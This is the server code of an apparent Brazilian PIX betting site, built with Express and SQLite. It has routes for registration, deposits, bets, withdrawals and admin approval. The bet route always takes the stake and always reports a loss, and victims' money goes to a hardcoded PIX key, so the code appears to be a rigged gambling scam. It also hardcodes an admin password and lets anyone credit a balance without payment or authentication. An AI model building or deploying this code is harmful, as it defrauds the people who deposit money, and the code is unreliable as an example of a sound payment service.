const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const QRCode = require('qrcode');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// Configurações
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend'))); // Serve o frontend

// Conecta ao banco de dados SQLite
const db = new sqlite3.Database('./database.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err) return console.error('Erro no banco:', err.message);
    console.log('✅ Conectado ao DB SQLite.');
    
    // Cria as tabelas
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        pix_key TEXT UNIQUE,
        balance REAL DEFAULT 0,
        status TEXT DEFAULT 'Pendente'
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS withdraw_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        amount REAL,
        status TEXT DEFAULT 'Pendente',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS admin_config (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        pix_key TEXT,
        min_deposit REAL,
        bonus_amount REAL,
        min_withdraw REAL
    )`, (err) => {
        if (!err) {
            // SUA CHAVE PIX ALEATÓRIA ESTÁ CONFIGURADA AQUI! ✅
            db.run(`INSERT OR IGNORE INTO admin_config 
                (id, pix_key, min_deposit, bonus_amount, min_withdraw) 
                VALUES (1, '1c5c21fc-fcbc-4b28-b285-74156c727917', 50, 30, 150)`);
            console.log('✅ Chave PIX configurada com sucesso!');
        }
    });
});

// Rota de teste para verificar se API está no ar
app.get('/api/test', (req, res) => {
    res.json({ message: 'API funcionando perfeitamente!', status: 'online' });
});

// Rota principal - serve o frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Rota para gerar QR Code da chave PIX do admin
app.get('/api/pix-qrcode', async (req, res) => {
    db.get('SELECT pix_key FROM admin_config WHERE id = 1', async (err, row) => {
        if (err) {
            return res.status(500).json({ error: 'Erro ao acessar banco de dados' });
        }
        if (!row || !row.pix_key) {
            return res.status(500).json({ error: 'Chave PIX não configurada' });
        }
        
        try {
            // Gera QR Code válido com a chave PIX
            const qrCodeDataUrl = await QRCode.toDataURL(row.pix_key);
            res.json({ 
                qrcode: qrCodeDataUrl, 
                pixKey: row.pix_key,
                message: 'QR Code gerado com sucesso!' 
            });
        } catch (err) {
            res.status(500).json({ error: 'Erro ao gerar QR Code' });
        }
    });
});

// Rota de cadastro
app.post('/api/register', (req, res) => {
    const { name, pixKey } = req.body;
    if (!name || !pixKey) {
        return res.status(400).json({ error: 'Nome e chave PIX são obrigatórios' });
    }
    
    db.run('INSERT INTO users (name, pix_key) VALUES (?, ?)',
        [name, pixKey],
        function(err) {
            if (err) {
                return res.status(500).json({ error: 'Erro no cadastro. Chave PIX já existe?' });
            }
            res.status(201).json({ 
                id: this.lastID, 
                name, 
                pixKey,
                message: 'Cadastro realizado com sucesso!' 
            });
        }
    );
});

// Rota para buscar usuário
app.get('/api/user/:pixKey', (req, res) => {
    db.get('SELECT * FROM users WHERE pix_key = ?', [req.params.pixKey], (err, row) => {
        if (err || !row) {
            return res.status(404).json({ error: 'Usuário não encontrado' });
        }
        res.json(row);
    });
});

// Rota para confirmar depósito
app.post('/api/confirm-deposit', (req, res) => {
    const { pixKey } = req.body;
    
    db.get('SELECT * FROM admin_config WHERE id = 1', (err, config) => {
        if (err || !config) {
            return res.status(500).json({ error: 'Erro de configuração' });
        }
        
        // Soma depósito mínimo + bônus (50 + 30 = 80)
        const totalBalance = config.min_deposit + config.bonus_amount;
        
        db.run('UPDATE users SET balance = balance + ?, status = "Ativo" WHERE pix_key = ?',
            [totalBalance, pixKey],
            function(err) {
                if (err) {
                    return res.status(500).json({ error: 'Erro ao creditar' });
                }
                res.json({ 
                    message: '✅ Depósito confirmado! Bônus de R$30 creditado.', 
                    newBalance: totalBalance 
                });
            }
        );
    });
});

// Rota de aposta (simulada)
app.post('/api/bet', (req, res) => {
    const { pixKey, amount } = req.body;
    
    if (!pixKey || !amount || amount < 5) {
        return res.status(400).json({ error: 'Aposta mínima: R$5' });
    }
    
    db.get('SELECT balance FROM users WHERE pix_key = ?', [pixKey], (err, user) => {
        if (err || !user) {
            return res.status(404).json({ error: 'Usuário não encontrado' });
        }
        
        if (user.balance < amount) {
            return res.status(400).json({ error: 'Saldo insuficiente' });
        }
        
        const newBalance = user.balance - amount;
        
        db.run('UPDATE users SET balance = ? WHERE pix_key = ?',
            [newBalance, pixKey],
            (err) => {
                if (err) {
                    return res.status(500).json({ error: 'Erro na aposta' });
                }
                res.json({ 
                    success: false, 
                    message: '😢 Não foi dessa vez! Tente novamente.', 
                    newBalance 
                });
            }
        );
    });
});

// Rota para solicitar saque
app.post('/api/request-withdraw', (req, res) => {
    const { pixKey, amount } = req.body;
    
    db.get('SELECT * FROM users WHERE pix_key = ?', [pixKey], (err, user) => {
        if (err || !user) {
            return res.status(404).json({ error: 'Usuário não encontrado' });
        }
        
        if (user.balance < amount) {
            return res.status(400).json({ error: 'Saldo insuficiente' });
        }
        
        db.get('SELECT min_withdraw FROM admin_config WHERE id = 1', (err, config) => {
            if (err || !config) {
                return res.status(500).json({ error: 'Erro de configuração' });
            }
            
            if (amount < config.min_withdraw) {
                return res.status(400).json({ error: `Saque mínimo: R$${config.min_withdraw}` });
            }
            
            db.run('INSERT INTO withdraw_requests (user_id, amount) VALUES (?, ?)',
                [user.id, amount],
                function(err) {
                    if (err) {
                        return res.status(500).json({ error: 'Erro ao solicitar saque' });
                    }
                    res.json({ 
                        message: '✅ Solicitação de saque enviada! Aguarde aprovação.' 
                    });
                }
            );
        });
    });
});

// --- ROTAS DO ADMIN ---
const ADMIN_PASSWORD = 'nexus@admin2025'; // 🔐 MUDE ESTA SENHA!

// Middleware de autenticação
const checkAuth = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || authHeader !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Não autorizado' });
    }
    next();
};

// Listar saques pendentes
app.get('/api/admin/withdraws', checkAuth, (req, res) => {
    const sql = `
        SELECT wr.*, u.name, u.pix_key 
        FROM withdraw_requests wr 
        JOIN users u ON wr.user_id = u.id 
        WHERE wr.status = 'Pendente'
    `;
    
    db.all(sql, [], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: 'Erro ao buscar saques' });
        }
        res.json(rows);
    });
});

// Aprovar saque
app.post('/api/admin/withdraw/:id/approve', checkAuth, (req, res) => {
    const { id } = req.params;
    
    db.run('UPDATE withdraw_requests SET status = "Aprovado" WHERE id = ?',
        [id],
        function(err) {
            if (err) {
                return res.status(500).json({ error: 'Erro ao aprovar saque' });
            }
            res.json({ message: 'Saque aprovado com sucesso!' });
        }
    );
});

// Rejeitar saque
app.post('/api/admin/withdraw/:id/reject', checkAuth, (req, res) => {
    const { id } = req.params;
    
    db.run('UPDATE withdraw_requests SET status = "Rejeitado" WHERE id = ?',
        [id],
        function(err) {
            if (err) {
                return res.status(500).json({ error: 'Erro ao rejeitar saque' });
            }
            res.json({ message: 'Saque rejeitado!' });
        }
    );
});

// Inicia o servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📱 Acesse: http://localhost:${PORT}`);
    console.log(`💰 Chave PIX configurada: 1c5c21fc-fcbc-4b28-b285-74156c727917`);
    console.log(`💵 Depósito mínimo: R$50 | Bônus: R$30 | Saque mínimo: R$150`);
});